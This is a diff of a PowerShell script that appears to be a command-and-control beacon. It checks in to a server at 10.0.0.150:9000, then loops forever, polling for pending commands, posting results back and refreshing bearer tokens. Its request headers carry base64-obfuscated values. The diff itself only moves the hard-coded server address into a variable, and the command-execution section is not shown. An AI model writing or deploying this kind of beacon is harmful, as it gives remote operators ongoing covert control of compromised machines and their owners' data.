@@ -55,9 +55,10 @@ $headerz = @{
     "User-Agent"     ="QmxhY2tUYWJieQo="
     "Agent"          ='TGVhcm5pbmdDVG9CRWxpdGUK'
 }
-
+$url = "https://10.0.0.150:9000"
 $json_doc = $json_format | ConvertTo-Json
-$response = Invoke-RestMethod "https://10.0.0.150:9000/first_check_in" -Method Post -Body $json_doc -Headers $headerz -ContentType 'application/json'
+
+$response = Invoke-RestMethod -Uri "$url/first_check_in" -Method Post -Body $json_doc -Headers $headerz -ContentType 'application/json'
 $doc_id = $response.id
 $refresh_token = $response.refresh
 $access_token = $response.token
@@ -71,7 +72,7 @@ $complete_commands =@{}
 
 while ($true){
 
-$polling_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
+$polling_resp = Invoke-RestMethod -Uri "$url/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
 $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
 
 
@@ -91,9 +92,9 @@ $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
   }
     $post_body.pending_commands = @()
     $json_post = $post_body | ConvertTo-Json
-    $post_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Post -Body $json_post -Headers $poll_headers -ContentType 'application/json'
+    $post_resp = Invoke-RestMethod -Uri "$url/poll" -Method Post -Body $json_post -Headers $poll_headers -ContentType 'application/json'
     # call refresh to get new token and add it to the headers hash table
-    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
+    $refresh_resp = Invoke-RestMethod "$url/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
     $access_token = $refresh_resp.token
     $poll_headers['Authorization'] = "Bearer $access_token"
 
@@ -101,7 +102,7 @@ $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
   else {
     #echo "no command"
     # call refresh to get new token and add it to the headers hash table
-    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
+    $refresh_resp = Invoke-RestMethod -Uri "$url/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
     $access_token = $refresh_resp.token
     $poll_headers['Authorization'] = "Bearer $access_token"
   }
